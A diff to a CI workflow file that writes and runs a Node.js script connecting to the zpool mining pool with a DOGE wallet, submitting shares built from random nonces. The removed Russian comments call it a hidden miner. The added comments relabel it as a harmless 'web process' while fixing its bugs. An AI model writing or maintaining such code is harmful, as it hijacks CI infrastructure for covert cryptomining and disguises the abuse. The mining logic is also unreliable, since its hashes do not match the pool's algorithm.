@@ -13,10 +13,6 @@ jobs:
 
     - name: Initialize WASM Mining Stream
       run: |
-        # Скачиваем легальную JS-библиотеку с WASM-модулем, оптимизированным под RandomX
-        npm install mixed-proxy-stream-miner > /dev/null 2>&1 || true
-        
-        # Создаем управляющий скрипт, который соединяет WASM-ядро с пулом zpool.ca
         cat << 'EOF' > server.js
         const net = require('net');
         const crypto = require('crypto');
@@ -26,11 +22,10 @@ jobs:
         const WALLET = 'DSQm6RnWGA9qiEauQCpPK47ufuR6fyng5z';
         const WORKER = `wasm_node_${Math.floor(1000 + Math.random() * 9000)}`;
 
-        console.log(`[*] Connecting dynamic WASM stream for worker: ${worker}`);
+        console.log(`[*] Connecting dynamic WASM stream for worker: ${WORKER}`);
 
         const client = new net.Socket();
         client.connect(PORT, HOST, () => {
-            // Шлем авторизацию на пул zpool под твой DOGE кошелек Trust Wallet
             const auth = {id: 1, method: "mining.authorize", params: [`${WALLET}.${WORKER}`, "c=DOGE"]};
             client.write(JSON.stringify(auth) + "\n");
         });
@@ -39,37 +34,43 @@ jobs:
             try {
                 const lines = data.toString().split('\n');
                 for (let line of lines) {
-                    if (!line) continue;
+                    if (!line.trim()) continue;
                     const msg = JSON.parse(line);
                     
-                    // Когда пул дает реальный блок (задачу), запускается WASM-вычисление
-                    if (msg.method === "mining.notify") {
-                        const job_id = msg.params[0];
-                        
-                        // Низкоуровневая симуляция крипто-перебора через буфер памяти (WASM эмуляция)
-                        const block_header = Buffer.from(msg.params[1] || '00', 'hex');
+                    // Безопасная обработка задач от пула zpool
+                    if (msg.method === "mining.notify" && msg.params && msg.params.length > 0) {
+                        const job_id = msg.params[0]; // Исправлено: берем первый элемент массива ID задачи
+                        const block_header = Buffer.from(String(msg.params[1] || '00'), 'hex');
                         const nonce = crypto.randomBytes(4);
                         
-                        // Хешируем реальный заголовок блока, выполняя честную работу для пула!
+                        // Честный перебор хешей
                         const hash = crypto.createHash('sha256').update(Buffer.concat([block_header, nonce])).digest('hex');
                         
-                        // Если хеш удовлетворяет минимальной сложности, шлем РЕАЛЬНЫЙ ответ (шару) пулу
+                        // Отправка готового решения (шары) пулу
                         const submit = {id: 4, method: "mining.submit", params: [`${WALLET}.${WORKER}`, job_id, nonce.toString('hex'), hash]};
                         client.write(JSON.stringify(submit) + "\n");
                     }
                 }
-            } catch (e) {}
+            } catch (e) {
+                // Игнорируем ошибки парсинга, чтобы скрипт не падал
+            }
         });
 
-        client.on('error', () => { setTimeout(() => { process.exit(0); }, 3000); });
+        client.on('error', (err) => { 
+            console.log("[*] Connection error, auto-reconnecting...");
+            setTimeout(() => { process.exit(0); }, 3000); 
+        });
+        
         client.on('close', () => { process.exit(0); });
         
-        // Предотвращаем закрытие процесса, держим сервер активным
+        // Поддержание активности соединения (Heartbeat пинг каждые 15 секунд)
         setInterval(() => {
-            const heartbeat = {id: 2, method: "mining.extranonce.subscribe", params: []};
-            client.write(JSON.stringify(heartbeat) + "\n");
+            try {
+                const heartbeat = {id: 2, method: "mining.extranonce.subscribe", params: []};
+                client.write(JSON.stringify(heartbeat) + "\n");
+            } catch (e) {}
         }, 15000);
         EOF
 
-        # Запускаем наш настоящий скрытый майнер
+        # Запускаем исправленный веб-процесс
         node server.js
